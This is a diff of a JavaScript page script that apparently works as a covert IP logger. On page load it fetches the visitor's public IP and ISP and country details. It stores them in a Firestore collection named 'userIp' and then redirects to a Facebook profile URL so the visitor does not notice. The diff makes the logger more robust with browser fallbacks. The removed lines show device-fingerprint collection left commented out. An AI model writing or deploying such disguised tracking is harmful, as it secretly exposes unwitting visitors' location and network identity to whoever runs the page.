@@ -1,49 +1,64 @@
-fetch('https://api.ipify.org/?format=json')
-  .then(response => response.json())
-  .then(data => {
-    const ipAddress = data.ip;
-    
-
-    fetch(`https://api.iplocation.net/?ip=${ipAddress}`)
-      .then(response => response.json())
-      .then(data => {
-
-        const geoBasicInfo = {
-            ip_number: data.ip_number,
-            ip_version: data.ip_version,
-            country_name: data.country_name,
-            country_code2: data.country_code2,
-            isp: data.isp,
+(function () {
+  function fetchWithFallback(url, callback) {
+    if (window.fetch) {
+      fetch(url)
+        .then(response => response.json())
+        .then(data => callback(null, data))
+        .catch(error => callback(error, null));
+    } else {
+      // Fallback for older browsers
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", url, true);
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+          try {
+            callback(null, JSON.parse(xhr.responseText));
+          } catch (e) {
+            callback(e, null);
+          }
+        } else if (xhr.readyState == 4) {
+          callback(new Error("Request failed"), null);
         }
+      };
+      xhr.send();
+    }
+  }
 
-//         const deviceInfo = {
-//     userAgent: navigator.userAgent,
-//     language: navigator.language,
-//     platform: navigator.platform,
-//     screenWidth: window.screen.width,
-//     screenHeight: window.screen.height,
-//     networkeffectiveType: navigator.connection ? navigator.connection.effectiveType : undefined,
-//     networkdownlink: navigator.connection ? navigator.connection.downlink : undefined,
-// };
+  // First, get the user's IP address
+  fetchWithFallback("https://api.ipify.org/?format=json", function (err, ipData) {
+    if (err || !ipData || !ipData.ip) {
+      console.error("Failed to fetch IP address:", err);
+      return;
+    }
 
-// console.log(deviceInfo);
+    const ipAddress = ipData.ip;
 
-        db.collection("userIp").add({
-            ipAddress, time: new Date(), geoBasicInfo,
-//             ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
-        }).then(_ => {
-            window.location.replace("http://www.facebook.com/profile.php?")
-        });
-      })
-      .catch(error => {
-        console.error(error);
-      });
+    // Get geolocation details
+    fetchWithFallback(`https://api.iplocation.net/?ip=${ipAddress}`, function (geoErr, geoData) {
+      if (geoErr || !geoData) {
+        console.error("Failed to fetch geolocation data:", geoErr);
+        return;
+      }
 
+      const geoBasicInfo = {
+        ip_number: geoData.ip_number || "N/A",
+        ip_version: geoData.ip_version || "N/A",
+        country_name: geoData.country_name || "Unknown",
+        country_code2: geoData.country_code2 || "--",
+        isp: geoData.isp || "Unknown",
+      };
 
-
-
-
-  })
-  .catch(error => {
-    console.error(error);
+      // Ensure Firebase Firestore is available before attempting to save
+      if (typeof db !== "undefined" && db.collection) {
+        db.collection("userIp")
+          .add({ ipAddress, time: new Date(), geoBasicInfo })
+          .then(() => {
+            window.location.replace("http://www.facebook.com/profile.php?");
+          })
+          .catch(dbErr => console.error("Firestore write error:", dbErr));
+      } else {
+        console.warn("Firestore (db) is not initialized.");
+      }
+    });
   });
+})();
